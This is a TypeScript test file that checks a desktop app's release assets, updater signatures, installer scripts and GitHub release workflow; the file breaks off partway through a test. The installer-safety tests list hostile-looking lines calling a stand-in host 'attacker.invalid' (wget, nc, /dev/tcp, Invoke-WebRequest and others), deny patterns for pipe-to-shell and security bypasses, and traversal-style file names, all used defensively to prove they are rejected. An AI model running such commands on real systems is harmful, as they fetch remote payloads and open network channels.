import { chmodSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { spawnSync } from 'node:child_process'
import { parse } from 'yaml'
import { beforeAll, describe, expect, it } from 'vitest'
import {
  SUPPORTED_TARGETS,
  normalizeUpdaterManifest,
  selectInstallerAsset,
  validateChecksumText,
  validateReleaseManifest,
} from '../../scripts/verify-release-assets.mjs'
import { verifyInstallerNetworkPolicy } from '../../scripts/installer-network-policy.mjs'

interface FixtureAsset {
  name: string
  size: number
  sha256?: string
}

interface ReleaseFixture {
  tag: string
  assets: FixtureAsset[]
  updater: {
    version: string
    notes: string
    pub_date: string
    platforms: Record<string, { url: string; signature: string }>
  }
}

const fixture = JSON.parse(readFileSync('tests/fixtures/releases/valid-manifest.json', 'utf8')) as ReleaseFixture

const TEST_UPDATER_PUBLIC_KEY = `untrusted comment: minisign public key E7620F1842B4E81F
RWQf6LRCGA9i53mlYecO4IzT51TGPpvWucNSCh1CBM0QTaLn73Y7GFO3
`
const TEST_UPDATER_SIGNATURE_DOCUMENT = `untrusted comment: signature from minisign secret key
RUQf6LRCGA9i559r3g7V1qNyJDApGip8MfqcadIgT9CuhV3EMhHoN1mGTkUidF/z7SrlQgXdy8ofjb7bNJJylDOocrCo8KLzZwo=
trusted comment: timestamp:1556193335\tfile:test
y/rUw2y8/hOUYjZU71eHp/Wo1KZ40fGy2VJEDl34XMJM+TX48Ss/17u3IvIfbVR1FkZZSNCisQbuQY+bHwhEBg==`
const TEST_UPDATER_SIGNATURE = Buffer.from(TEST_UPDATER_SIGNATURE_DOCUMENT).toString('base64')
const signatureVerifierPath = join(
  'src-tauri',
  'target',
  'debug',
  'examples',
  `verify_release_signature${process.platform === 'win32' ? '.exe' : ''}`,
)
const UPDATER_ALIAS_PAIRS = [
  ['darwin-aarch64', 'darwin-aarch64-app'],
  ['darwin-x86_64', 'darwin-x86_64-app'],
  ['windows-x86_64', 'windows-x86_64-nsis'],
] as const

function materializeCryptoRelease(useApiUrls = false) {
  const root = mkdtempSync(join(tmpdir(), 'workflow-studio-release-assets-'))
  const directory = join(root, 'assets')
  const tauriConfig = join(root, 'tauri.conf.json')
  mkdirSync(directory)

  const updater = structuredClone(fixture.updater)
  for (const platform of Object.values(updater.platforms)) {
    platform.signature = TEST_UPDATER_SIGNATURE
    if (useApiUrls) {
      platform.url = 'https://api.github.com/repos/cmetech/workflow-studio/releases/assets/12345'
    }
  }
  for (const asset of fixture.assets) {
    if (asset.name === 'SHA256SUMS') continue
    let bytes = `installer:${asset.name}\n`
    if (asset.name === 'latest.json') bytes = `${JSON.stringify(updater)}\n`
    if (asset.name.endsWith('.sig')) bytes = `${TEST_UPDATER_SIGNATURE}\n`
    if (/\.(?:app|nsis|AppImage)\.(?:tar\.gz|zip)$/.test(asset.name)) bytes = 'test'
    writeFileSync(join(directory, asset.name), bytes)
  }
  writeFileSync(
    tauriConfig,
    `${JSON.stringify({ plugins: { updater: { pubkey: Buffer.from(TEST_UPDATER_PUBLIC_KEY).toString('base64') } } })}\n`,
  )
  return { root, directory, tauriConfig }
}

function manifestWith(mutator: (copy: ReleaseFixture) => void): ReleaseFixture {
  const copy = structuredClone(fixture)
  mutator(copy)
  return copy
}

function fixtureAsset(copy: ReleaseFixture, name: string): FixtureAsset {
  const asset = copy.assets.find((candidate) => candidate.name === name)
  if (!asset) throw new Error(`Fixture is missing ${name}`)
  return asset
}

describe('release asset verification', () => {
  beforeAll(() => {
    const build = spawnSync('cargo', [
      'build',
      '--quiet',
      '--locked',
      '--manifest-path',
      'src-tauri/Cargo.toml',
      '--example',
      'verify_release_signature',
    ])
    expect(build.status, build.stderr?.toString()).toBe(0)
  }, 60_000)
  it.each([
    ['darwin', 'aarch64', 'LOOP24-Workflow-Studio_1.0.1_macos_aarch64.dmg'],
    ['darwin', 'x86_64', 'LOOP24-Workflow-Studio_1.0.1_macos_x86_64.dmg'],
    ['windows', 'x86_64', 'LOOP24-Workflow-Studio_1.0.1_windows_x86_64-setup.exe'],
  ])('selects exactly one %s/%s installer', (os, arch, expected) => {
    expect(selectInstallerAsset(fixture.assets, fixture.tag, os, arch).name).toBe(expected)
  })

  it.each([
    ['windows', 'aarch64'],
    ['linux', 'x86_64'],
    ['linux', 'aarch64'],
    ['freebsd', 'x86_64'],
    ['darwin', 'arm64'],
  ])('fails clearly rather than falling back for unsupported %s/%s', (os, arch) => {
    expect(() => selectInstallerAsset(fixture.assets, fixture.tag, os, arch)).toThrow(
      `Unsupported release target: ${os}/${arch}`,
    )
  })

  it('declares only native targets proven by the release matrix', () => {
    expect(SUPPORTED_TARGETS).toEqual(['darwin-aarch64', 'darwin-x86_64', 'windows-x86_64'])
  })

  it('accepts exactly the v1.0.1 macOS and Windows public inventory', () => {
    expect(validateReleaseManifest(fixture)).toEqual({
      tag: 'v1.0.1',
      version: '1.0.1',
      assetCount: 11,
      updaterTargets: SUPPORTED_TARGETS,
    })
  })

  it('normalizes Tauri Action API URLs to public exact-tag asset URLs without altering signatures', () => {
    const updater = structuredClone(fixture.updater)
    for (const platform of Object.values(updater.platforms)) {
      platform.url = 'https://api.github.com/repos/cmetech/workflow-studio/releases/assets/12345'
    }
    const normalized = normalizeUpdaterManifest(updater, fixture.tag)
    expect(normalized.platforms['darwin-aarch64-app']).toEqual({
      url: 'https://github.com/cmetech/workflow-studio/releases/download/v1.0.1/LOOP24-Workflow-Studio_1.0.1_macos_aarch64.app.tar.gz',
      signature: 'signed-darwin-arm',
    })
    expect(normalized.platforms['windows-x86_64'].url).toContain(
      '/v1.0.1/LOOP24-Workflow-Studio_1.0.1_windows_x86_64.nsis.zip',
    )
    expect(updater.platforms['windows-x86_64']!.url).toContain('api.github.com')
  })

  it.each(UPDATER_ALIAS_PAIRS)('rejects manifest signatures that differ between %s and %s', (primary, alias) => {
    const invalid = manifestWith((copy) => {
      copy.updater.platforms[alias]!.signature = `${copy.updater.platforms[primary]!.signature}-mismatch`
    })

    expect(() => validateReleaseManifest(invalid)).toThrow(/must match/i)
    expect(() => normalizeUpdaterManifest(invalid.updater, invalid.tag)).toThrow(/must match/i)
  })

  it.each(UPDATER_ALIAS_PAIRS)('does not rewrite latest.json when %s and %s signatures differ', (primary, alias) => {
    const { root, directory } = materializeCryptoRelease(true)
    const updaterPath = join(directory, 'latest.json')
    try {
      const updater = JSON.parse(readFileSync(updaterPath, 'utf8')) as ReleaseFixture['updater']
      updater.platforms[alias]!.signature = `${updater.platforms[primary]!.signature}-mismatch`
      const mutatedBytes = `${JSON.stringify(updater)}\n`
      writeFileSync(updaterPath, mutatedBytes)

      const result = spawnSync(
        process.execPath,
        ['scripts/verify-release-assets.mjs', '--directory', directory, '--tag', fixture.tag, '--normalize-updater'],
        { encoding: 'utf8' },
      )

      expect(result.status).toBe(1)
      expect(result.stderr).toMatch(/must match/i)
      expect(readFileSync(updaterPath, 'utf8')).toBe(mutatedBytes)
    } finally {
      rmSync(root, { recursive: true, force: true })
    }
  })

  it.each([
    'Other-Workflow-Studio_1.0.1_linux_x86_64.AppImage',
    'LOOP24-Workflow-Studio_9.9.9_linux_x86_64.AppImage',
    '../LOOP24-Workflow-Studio_1.0.1_linux_x86_64.AppImage',
    'LOOP24-Workflow-Studio_1.0.1_linux_x86_64/app.AppImage',
    'loop24-workflow-studio_1.0.1_linux_x86_64.AppImage',
    'LOOP24-Workflow-Studio_1.0.1_linux_x86_64.AppImage\nsecond',
  ])('rejects a wrong-brand/version or unsafe asset name: %s', (name) => {
    const invalid = manifestWith((copy) => {
      const existing = fixtureAsset(copy, 'LOOP24-Workflow-Studio_1.0.1_windows_x86_64-setup.exe')
      Object.assign(existing, { name })
    })
    expect(() => validateReleaseManifest(invalid)).toThrow()
  })

  it('rejects case-folded collisions and duplicate installers', () => {
    const invalid = manifestWith((copy) => {
      const installer = fixtureAsset(copy, 'LOOP24-Workflow-Studio_1.0.1_windows_x86_64-setup.exe')
      copy.assets.push({ ...installer, name: installer.name.toLowerCase() })
    })
    expect(() => validateReleaseManifest(invalid)).toThrow(/collision/i)
  })

  it.each([
    'LOOP24-Workflow-Studio_1.0.1_linux_x86_64.AppImage',
    'LOOP24-Workflow-Studio_1.0.1_linux_x86_64.deb',
    'LOOP24-Workflow-Studio_1.0.1_linux_x86_64.rpm',
    'unexpected-release-note.txt',
  ])('rejects stale Linux or unknown release assets: %s', (name) => {
    const invalid = manifestWith((copy) => {
      copy.assets.push({ name, size: 115, sha256: 'e'.repeat(64) })
    })
    expect(() => validateReleaseManifest(invalid)).toThrow(/unknown/i)
  })

  it('rejects stale Linux updater keys', () => {
    const invalid = manifestWith((copy) => {
      copy.updater.platforms['linux-x86_64'] = {
        url: 'https://github.com/cmetech/workflow-studio/releases/download/v1.0.1/LOOP24-Workflow-Studio_1.0.1_linux_x86_64.AppImage.tar.gz',
        signature: 'signed-linux',
      }
    })
    expect(() => validateReleaseManifest(invalid)).toThrow(/updater target/i)
  })

  it('rejects missing checksums, signature companions, updater targets, and empty bytes', () => {
    const noChecksum = manifestWith((copy) => {
      fixtureAsset(copy, 'LOOP24-Workflow-Studio_1.0.1_macos_aarch64.dmg').sha256 = undefined
    })
    const noSignature = manifestWith((copy) => {
      copy.assets = copy.assets.filter((asset) => !asset.name.endsWith('macos_aarch64.app.tar.gz.sig'))
    })
    const noUpdaterTarget = manifestWith((copy) => {
      delete copy.updater.platforms['windows-x86_64']
    })
    const zeroBytes = manifestWith((copy) => {
      fixtureAsset(copy, 'LOOP24-Workflow-Studio_1.0.1_macos_aarch64.dmg').size = 0
    })

    expect(() => validateReleaseManifest(noChecksum)).toThrow(/checksum/i)
    expect(() => validateReleaseManifest(noSignature)).toThrow(/signature/i)
    expect(() => validateReleaseManifest(noUpdaterTarget)).toThrow(/updater target/i)
    expect(() => validateReleaseManifest(zeroBytes)).toThrow(/empty/i)
  })

  it('rejects updater URLs for unknown or cross-release assets', () => {
    const invalid = manifestWith((copy) => {
      copy.updater.platforms['windows-x86_64']!.url =
        'https://github.com/cmetech/workflow-studio/releases/download/v1.0.1/not-uploaded.tar.gz'
    })
    expect(() => validateReleaseManifest(invalid)).toThrow(/not present/i)
  })

  it('rejects missing or cross-version updater identity fields', () => {
    const missingDate = manifestWith((copy) => {
      copy.updater.pub_date = ''
    })
    const wrongVersion = manifestWith((copy) => {
      copy.updater.version = '9.9.9'
    })
    expect(() => validateReleaseManifest(missingDate)).toThrow(/publication date/i)
    expect(() => validateReleaseManifest(wrongVersion)).toThrow(/updater version/i)
  })

  it('parses checksum lines as exact local filenames and rejects unknown paths', () => {
    const text = fixture.assets
      .filter((asset) => asset.sha256)
      .map((asset) => `${asset.sha256}  ${asset.name}`)
      .join('\n')
    expect(
      validateChecksumText(
        text,
        fixture.assets.map((asset) => asset.name),
      ),
    ).toHaveLength(10)
    expect(() => validateChecksumText(`${text}\n${'e'.repeat(64)}  ../outside`, [])).toThrow(/unknown checksum path/i)
  })

  it('separates updater normalization from checksumming published bytes', () => {
    const { root, directory, tauriConfig } = materializeCryptoRelease(true)
    try {
      const unpublished = spawnSync(
        process.execPath,
        [
          'scripts/verify-release-assets.mjs',
          '--directory',
          directory,
          '--tag',
          fixture.tag,
          '--write-checksums',
          '--signature-verifier',
          signatureVerifierPath,
          '--tauri-config',
          tauriConfig,
        ],
        { encoding: 'utf8' },
      )
      expect(unpublished.status).toBe(1)
      expect(unpublished.stderr).toContain('exact v1.0.1 release')
      expect(readFileSync(join(directory, 'latest.json'), 'utf8')).toContain('api.github.com')

      const normalized = spawnSync(
        process.execPath,
        ['scripts/verify-release-assets.mjs', '--directory', directory, '--tag', fixture.tag, '--normalize-updater'],
        { encoding: 'utf8' },
      )
      expect(normalized.status).toBe(0)
      expect(readFileSync(join(directory, 'latest.json'), 'utf8')).toContain('/releases/download/v1.0.1/')

      const checksummed = spawnSync(
        process.execPath,
        [
          'scripts/verify-release-assets.mjs',
          '--directory',
          directory,
          '--tag',
          fixture.tag,
          '--write-checksums',
          '--signature-verifier',
          signatureVerifierPath,
          '--tauri-config',
          tauriConfig,
        ],
        { encoding: 'utf8' },
      )
      expect(checksummed.status).toBe(0)
      const checksumBytes = readFileSync(join(directory, 'SHA256SUMS'), 'utf8')
      const latestBytes = readFileSync(join(directory, 'latest.json'), 'utf8')

      const finalValidation = spawnSync(
        process.execPath,
        [
          'scripts/verify-release-assets.mjs',
          '--directory',
          directory,
          '--tag',
          fixture.tag,
          '--signature-verifier',
          signatureVerifierPath,
          '--tauri-config',
          tauriConfig,
        ],
        { encoding: 'utf8' },
      )
      expect(finalValidation.status).toBe(0)
      expect(readFileSync(join(directory, 'SHA256SUMS'), 'utf8')).toBe(checksumBytes)
      expect(readFileSync(join(directory, 'latest.json'), 'utf8')).toBe(latestBytes)
    } finally {
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('rejects a stale Linux artifact before updater normalization or checksum generation', () => {
    const { root, directory, tauriConfig } = materializeCryptoRelease(true)
    const updaterPath = join(directory, 'latest.json')
    const updaterBytes = readFileSync(updaterPath, 'utf8')
    try {
      writeFileSync(join(directory, 'LOOP24-Workflow-Studio_1.0.1_linux_x86_64.AppImage'), 'stale')

      const normalization = spawnSync(
        process.execPath,
        ['scripts/verify-release-assets.mjs', '--directory', directory, '--tag', fixture.tag, '--normalize-updater'],
        { encoding: 'utf8' },
      )
      expect(normalization.status).toBe(1)
      expect(normalization.stderr).toContain('Unknown product, version, platform, or architecture asset')
      expect(readFileSync(updaterPath, 'utf8')).toBe(updaterBytes)

      const checksumming = spawnSync(
        process.execPath,
        [
          'scripts/verify-release-assets.mjs',
          '--directory',
          directory,
          '--tag',
          fixture.tag,
          '--write-checksums',
          '--signature-verifier',
          signatureVerifierPath,
          '--tauri-config',
          tauriConfig,
        ],
        { encoding: 'utf8' },
      )
      expect(checksumming.status).toBe(1)
      expect(checksumming.stderr).toContain('Unknown product, version, platform, or architecture asset')
      expect(() => readFileSync(join(directory, 'SHA256SUMS'))).toThrow()
    } finally {
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('rejects updater metadata that does not exactly match its companion signature before checksumming', () => {
    const { root, directory, tauriConfig } = materializeCryptoRelease()
    try {
      const updaterPath = join(directory, 'latest.json')
      const updater = JSON.parse(readFileSync(updaterPath, 'utf8')) as ReleaseFixture['updater']
      updater.platforms['darwin-aarch64']!.signature = `${TEST_UPDATER_SIGNATURE}tampered`
      updater.platforms['darwin-aarch64-app']!.signature = `${TEST_UPDATER_SIGNATURE}tampered`
      writeFileSync(updaterPath, `${JSON.stringify(updater)}\n`)

      const result = spawnSync(
        process.execPath,
        [
          'scripts/verify-release-assets.mjs',
          '--directory',
          directory,
          '--tag',
          fixture.tag,
          '--write-checksums',
          '--signature-verifier',
          signatureVerifierPath,
          '--tauri-config',
          tauriConfig,
        ],
        { encoding: 'utf8' },
      )
      expect(result.status).toBe(1)
      expect(result.stderr).toContain('does not match its companion .sig')
      expect(() => readFileSync(join(directory, 'SHA256SUMS'))).toThrow()
    } finally {
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('rejects updater bytes with an invalid cryptographic signature before checksumming', () => {
    const { root, directory, tauriConfig } = materializeCryptoRelease()
    try {
      writeFileSync(join(directory, 'LOOP24-Workflow-Studio_1.0.1_macos_aarch64.app.tar.gz'), 'Test')
      const result = spawnSync(
        process.execPath,
        [
          'scripts/verify-release-assets.mjs',
          '--directory',
          directory,
          '--tag',
          fixture.tag,
          '--write-checksums',
          '--signature-verifier',
          signatureVerifierPath,
          '--tauri-config',
          tauriConfig,
        ],
        { encoding: 'utf8' },
      )
      expect(result.status).toBe(1)
      expect(result.stderr).toContain('Cryptographic updater signature verification failed')
      expect(() => readFileSync(join(directory, 'SHA256SUMS'))).toThrow()
    } finally {
      rmSync(root, { recursive: true, force: true })
    }
  })
})

describe('downloader static safety', () => {
  const shell = () => readFileSync('scripts/install.sh', 'utf8')
  const powershell = () => readFileSync('scripts/install.ps1', 'utf8')

  it('resolves x64 Windows through the PowerShell 5.1-compatible environment fallback', () => {
    const probe = spawnSync('pwsh', ['-NoLogo', '-NoProfile', '-Command', '$PSVersionTable.PSVersion'])
    if (probe.error) return

    const directory = mkdtempSync(join(tmpdir(), 'workflow-studio-powershell-architecture-'))
    const harness = join(directory, 'architecture-test.ps1')
    try {
      writeFileSync(
        harness,
        `$tokens = $null
$parseErrors = $null
$ast = [System.Management.Automation.Language.Parser]::ParseFile($args[0], [ref] $tokens, [ref] $parseErrors)
if ($parseErrors.Count -ne 0) { throw 'Installer script did not parse' }
$functionAst = $ast.Find({
  param($node)
  $node -is [System.Management.Automation.Language.FunctionDefinitionAst] -and
    $node.Name -eq 'Get-WindowsArchitecture'
}, $true)
if ($null -eq $functionAst) { throw 'Get-WindowsArchitecture was not defined' }
Invoke-Expression $functionAst.Extent.Text
function Get-CimInstance { throw 'CIM unavailable in compatibility fixture' }
$env:PROCESSOR_ARCHITEW6432 = 'AMD64'
$env:PROCESSOR_ARCHITECTURE = 'x86'
Get-WindowsArchitecture
`,
      )

      const result = spawnSync('pwsh', ['-NoLogo', '-NoProfile', '-File', harness, 'scripts/install.ps1'], {
        encoding: 'utf8',
      })
      expect(result.status, result.stderr).toBe(0)
      expect(result.stdout.trim()).toBe('X64')
    } finally {
      rmSync(directory, { recursive: true, force: true })
    }
  })

  it('contains no shell evaluation, remote pipe execution, security bypass, or broad cleanup', () => {
    for (const script of [shell(), powershell()]) {
      expect(script).not.toMatch(/\beval\b/)
      expect(script).not.toMatch(/curl[^\n|]*\|\s*(?:sh|bash)/i)
      expect(script).not.toMatch(/Invoke-Expression|\biex\b/i)
      expect(script).not.toMatch(/xattr\s+-[a-z]*d|spctl|Set-MpPreference|ExecutionPolicy\s+Bypass/i)
      expect(script).not.toMatch(/rm\s+-rf|Remove-Item[^\n]*-Recurse/i)
    }
  })

  it('extracts every downloader network expression and permits only the exact GitHub release roots', () => {
    expect(verifyInstallerNetworkPolicy(shell(), powershell())).toEqual({
      shell: ['$API_URL', '$RELEASE_ROOT/$TAG/$INSTALLER_NAME', '$RELEASE_ROOT/$TAG/SHA256SUMS'],
      powershell: ['$ApiUrl', '$ReleaseRoot/$Tag/$InstallerName', '$ReleaseRoot/$Tag/SHA256SUMS'],
    })
    expect(() =>
      verifyInstallerNetworkPolicy(`${shell()}\ntrue && curl "https://attacker.invalid/payload"\n`, powershell()),
    ).toThrow(/unapproved installer network destination/i)
    expect(() =>
      verifyInstallerNetworkPolicy(
        shell(),
        `${powershell()}\nInvoke-WebRequest -Uri 'https://attacker.invalid/payload'\n`,
      ),
    ).toThrow(/unapproved installer network destination/i)

    const shellBypasses = [
      'wget "https://attacker.invalid/payload"',
      `node -e "fetch('https://attacker.invalid/payload')"`,
      `openssl s_client -connect attacker.invalid:443`,
      `nc attacker.invalid 443`,
      `exec 3<>/dev/tcp/attacker.invalid/443`,
      `python3 -c "import urllib.request; urllib.request.urlopen('https://attacker.invalid')"`,
      `python3 <<'PY'\nimport urllib.request\nurllib.request.urlopen('https://attacker.invalid')\nPY`,
      'curl "$API_URL"; curl "https://attacker.invalid/payload"',
      'curl "$DYNAMIC_URL"',
      'curl "https://attacker.invalid/payload"',
      'printf "%s\\n" "an appended executable statement"',
    ]
    for (const bypass of shellBypasses) {
      expect(() => verifyInstallerNetworkPolicy(`${shell()}\n${bypass}\n`, powershell()), bypass).toThrow(
        /unapproved installer network destination/i,
      )
    }

    const powershellBypasses = [
      "wget -Uri 'https://attacker.invalid/payload'",
      "iwr -Uri 'https://attacker.invalid/payload'",
      "irm -Uri 'https://attacker.invalid/payload'",
      "[System.Net.WebRequest]::Create('https://attacker.invalid/payload').GetResponse()",
      "[System.Net.Sockets.TcpClient]::new('attacker.invalid', 443)",
      "[Net.WebClient]::new().DownloadString('https://attacker.invalid/payload')",
      '[Net.Http.HttpClient]::new()',
      "Start-BitsTransfer -Source 'https://attacker.invalid/payload'",
      "Invoke-WebRequest -Uri $ApiUrl; Invoke-WebRequest -Uri 'https://attacker.invalid/payload'",
      'Invoke-WebRequest -Uri $DynamicUrl',
      "Invoke-WebRequest -Uri 'https://attacker.invalid/payload'",
      "Write-Output 'an appended executable statement'",
    ]
    for (const bypass of powershellBypasses) {
      expect(() => verifyInstallerNetworkPolicy(shell(), `${powershell()}\n${bypass}\n`), bypass).toThrow(
        /unapproved installer network destination/i,
      )
    }
  })

  it('uses exact architecture mapping, local SHA-256 verification, and verified launch ordering', () => {
    expect(shell()).toContain('uname -m')
    expect(shell()).toMatch(/sha256sum|shasum/)
    expect(shell()).toContain('EXPECTED_CHECKSUM')
    expect(powershell()).toContain('Get-FileHash')

    for (const script of [shell(), powershell()]) {
      const verification = script.indexOf('EXPECTED_CHECKSUM')
      const launch = Math.max(script.indexOf('open "$INSTALLER_PATH"'), script.indexOf('Start-Process'))
      expect(verification).toBeGreaterThan(-1)
      expect(launch).toBeGreaterThan(verification)
      expect(script).toMatch(/Unsupported (operating system|architecture|release target)/)
    }
  })

  it('rejects Linux before calling curl or querying release metadata', () => {
    const directory = mkdtempSync(join(tmpdir(), 'workflow-studio-linux-installer-'))
    const curlSentinel = join(directory, 'curl-called')
    try {
      const uname = join(directory, 'uname')
      const curl = join(directory, 'curl')
      writeFileSync(uname, '#!/bin/sh\n[ "$1" = "-s" ] && echo Linux || echo x86_64\n')
      writeFileSync(curl, `#!/bin/sh\nprintf 'called\\n' > '${curlSentinel}'\nexit 99\n`)
      chmodSync(uname, 0o700)
      chmodSync(curl, 0o700)

      const result = spawnSync('sh', ['scripts/install.sh'], {
        encoding: 'utf8',
        env: { ...process.env, PATH: `${directory}:${process.env.PATH ?? ''}` },
      })

      expect(result.status).toBe(1)
      expect(result.stderr).toContain('macOS only')
      expect(result.stdout).not.toContain('checking the latest public release')
      expect(() => readFileSync(curlSentinel)).toThrow()
    } finally {
      rmSync(directory, { recursive: true, force: true })
    }
  })

  it('rejects non-Windows hosts before PowerShell performs network or architecture selection', () => {
    if (process.platform === 'win32') return
    const probe = spawnSync('pwsh', ['-NoLogo', '-NoProfile', '-Command', '$PSVersionTable.PSVersion'])
    if (probe.error) return

    const result = spawnSync('pwsh', ['-NoLogo', '-NoProfile', '-File', 'scripts/install.ps1'], {
      encoding: 'utf8',
    })
    expect(result.status).toBe(1)
    expect(result.stderr).toContain('Unsupported operating system')
    expect(result.stdout).not.toContain('checking the latest public release')
  })

  it('rejects a non-semantic GitHub tag before any artifact is downloaded', () => {
    const directory = mkdtempSync(join(tmpdir(), 'workflow-studio-installer-test-'))
    try {
      const uname = join(directory, 'uname')
      const curl = join(directory, 'curl')
      writeFileSync(uname, '#!/bin/sh\n[ "$1" = "-s" ] && echo Darwin || echo x86_64\n')
      writeFileSync(curl, '#!/bin/sh\nprintf \'{\\n  "tag_name": "v1.2x.3",\\n  "assets": []\\n}\\n\'\n')
      chmodSync(uname, 0o700)
      chmodSync(curl, 0o700)

      const result = spawnSync('sh', ['scripts/install.sh'], {
        encoding: 'utf8',
        env: { ...process.env, PATH: `${directory}:${process.env.PATH ?? ''}` },
      })
      expect(result.status).toBe(1)
      expect(result.stderr).toContain('latest release returned an invalid tag')
      expect(result.stdout).not.toContain('downloading LOOP24-Workflow-Studio')
    } finally {
      rmSync(directory, { recursive: true, force: true })
    }
  })
})

interface WorkflowJob {
  needs?: string | string[]
  outputs?: Record<string, string>
  permissions?: Record<string, string>
  strategy?: { 'max-parallel'?: number; matrix?: { include?: Array<Record<string, unknown>> } }
  steps?: Array<{
    id?: string
    if?: string
    name?: string
    shell?: string
    uses?: string
    run?: string
    env?: Record<string, string>
    with?: Record<string, unknown>
    'working-directory'?: string
  }>
}

interface ReleaseWorkflow {
  on?: {
    push?: { tags?: string[] }
    workflow_dispatch?: { inputs?: { tag?: { required?: boolean; type?: string } } }
  }
  permissions?: Record<string, string>
  jobs?: Record<string, WorkflowJob>
}

describe('release workflow contract', () => {
  const workflow = () => parse(readFileSync('.github/workflows/release.yml', 'utf8')) as ReleaseWorkflow
  const jobSteps = (job: string) => workflow().jobs?.[job]?.steps ?? []
  const namedStep = (job: string, name: string) => {
    const step = jobSteps(job).find((candidate) => candidate.name === name)
    expect(step, `${job} must define the ${name} step`).toBeDefined()
    return step!
  }

  it('dispatches only from base with a required tag and resolves distinct application/tooling commits', () => {
    const release = workflow()
    expect(Object.keys(release.on ?? {})).toEqual(['workflow_dispatch'])
    expect(release.on?.workflow_dispatch?.inputs?.tag).toMatchObject({ required: true, type: 'string' })
    expect(release.permissions).toEqual({ contents: 'read' })

    const validate = release.jobs?.validate
    expect(validate?.outputs).toEqual({
      tag: '${{ steps.release-ref.outputs.tag }}',
      application_commit: '${{ steps.release-ref.outputs.application_commit }}',
      tooling_commit: '${{ github.sha }}',
    })
    const request = namedStep('validate', 'Validate dispatch ref and tag syntax')
    expect(request.env).toEqual({
      DISPATCH_REF: '${{ github.ref }}',
      REQUESTED_TAG: '${{ inputs.tag }}',
    })
    expect(request.run).toContain('[[ "$DISPATCH_REF" == "refs/heads/base" ]]')
    const resolution = namedStep('validate', 'Validate immutable application and tooling commits')
    expect(resolution.env).toEqual({
      TAG: '${{ steps.requested-ref.outputs.tag }}',
      TOOLING_COMMIT: '${{ github.sha }}',
    })
    expect(resolution['working-directory']).toBeUndefined()
    expect(resolution.run).toContain('git merge-base --is-ancestor "$TOOLING_COMMIT" "origin/base"')
    expect(resolution.run).toContain('TAG_COMMIT=$(git rev-parse "refs/tags/$TAG^{commit}")')
    expect(resolution.run).toContain('application_commit=$TAG_COMMIT')
    expect(resolution.run).toContain('Release tooling commit')
    expect(resolution.run).toContain('Application commit')
  })

  it.each([['v1.2.3'], ['v0.0.0-alpha'], ['v1.2.3-alpha.1'], ['v1.2.3-0A.0+build.5'], ['v1.2.3+build.001']])(
    'executes strict SemVer validation for valid tag %s',
    (tag) => {
      const run = namedStep('validate', 'Validate dispatch ref and tag syntax').run!
      const root = mkdtempSync(join(tmpdir(), 'workflow-studio-semver-'))
      try {
        const result = spawnSync('bash', ['-c', run], {
          encoding: 'utf8',
          env: {
            ...process.env,
            DISPATCH_REF: 'refs/heads/base',
            REQUESTED_TAG: tag,
            GITHUB_OUTPUT: join(root, 'output'),
          },
        })
        expect(result.status, result.stderr).toBe(0)
        expect(readFileSync(join(root, 'output'), 'utf8')).toContain(`tag=${tag}`)
      } finally {
        rmSync(root, { recursive: true, force: true })
      }
    },
  )

  it.each([
    ['refs/heads/feature', 'v1.2.3'],
    ['refs/heads/base', 'v1.2.3-01'],
    ['refs/heads/base', 'v1.2.3-a..b'],
    ['refs/heads/base', 'v1.2.3-a.'],
    ['refs/heads/base', 'v1.2.3+build..5'],
    ['refs/heads/base', 'v01.2.3'],
  ])('rejects invalid dispatch/tag pair %s %s before checkout', (dispatchRef, tag) => {
    const run = namedStep('validate', 'Validate dispatch ref and tag syntax').run!
    const root = mkdtempSync(join(tmpdir(), 'workflow-studio-semver-invalid-'))
    try {
      const result = spawnSync('bash', ['-c', run], {
        encoding: 'utf8',
        env: {
          ...process.env,
          DISPATCH_REF: dispatchRef,
          REQUESTED_TAG: tag,
          GITHUB_OUTPUT: join(root, 'output'),
        },
      })
      expect(result.status).toBe(1)
      expect(result.stderr).toMatch(/must be dispatched from base|Invalid version tag/)
    } finally {
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('executes commit resolution and rejects tooling outside base', () => {
    const run = namedStep('validate', 'Validate immutable application and tooling commits').run!
    const root = mkdtempSync(join(tmpdir(), 'workflow-studio-release-boundary-'))
    const origin = join(root, 'origin')
    const checkout = join(root, 'checkout')
    const output = join(root, 'output')
    const summary = join(root, 'summary')
    const git = (cwd: string, ...args: string[]) => {
      const result = spawnSync('git', args, { cwd, encoding: 'utf8' })
      expect(result.status, result.stderr).toBe(0)
      return result.stdout.trim()
    }

    try {
      mkdirSync(origin)
      git(origin, 'init', '-b', 'base')
      git(origin, 'config', 'user.name', 'Release Test')
      git(origin, 'config', 'user.email', 'release@example.invalid')
      writeFileSync(join(origin, 'application'), 'tagged\n')
      git(origin, 'add', 'application')
      git(origin, 'commit', '-m', 'tagged application')
      const applicationCommit = git(origin, 'rev-parse', 'HEAD')
      git(origin, 'tag', '-a', 'v1.2.3', '-m', 'v1.2.3')
      writeFileSync(join(origin, 'tooling'), 'release tooling\n')
      git(origin, 'add', 'tooling')
      git(origin, 'commit', '-m', 'release tooling')
      const toolingCommit = git(origin, 'rev-parse', 'HEAD')
      git(origin, 'checkout', '--orphan', 'unrelated')
      git(origin, 'rm', '-rf', '.')
      writeFileSync(join(origin, 'unrelated'), 'outside base\n')
      git(origin, 'add', 'unrelated')
      git(origin, 'commit', '-m', 'unrelated tooling')
      const unrelatedCommit = git(origin, 'rev-parse', 'HEAD')
      git(origin, 'checkout', 'base')
      git(root, 'clone', origin, checkout)
      git(checkout, 'checkout', '--detach', 'v1.2.3')

      const invoke = (commit: string) =>
        spawnSync('bash', ['-c', run], {
          cwd: checkout,
          encoding: 'utf8',
          env: {
            ...process.env,
            TAG: 'v1.2.3',
            TOOLING_COMMIT: commit,
            GITHUB_OUTPUT: output,
            GITHUB_STEP_SUMMARY: summary,
          },
        })

      const unrelated = invoke(unrelatedCommit)
      expect(unrelated.status).toBe(1)
      expect(unrelated.stderr).toContain('does not belong to base')

      const accepted = invoke(toolingCommit)
      expect(accepted.status, accepted.stderr).toBe(0)
      expect(readFileSync(output, 'utf8')).toContain(`application_commit=${applicationCommit}`)
      expect(readFileSync(summary, 'utf8')).toContain(toolingCommit)
    } finally {
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('uses separate credential-free application and pinned release-tooling checkouts in every job', () => {
    const expectedRefs = {
      validate: {
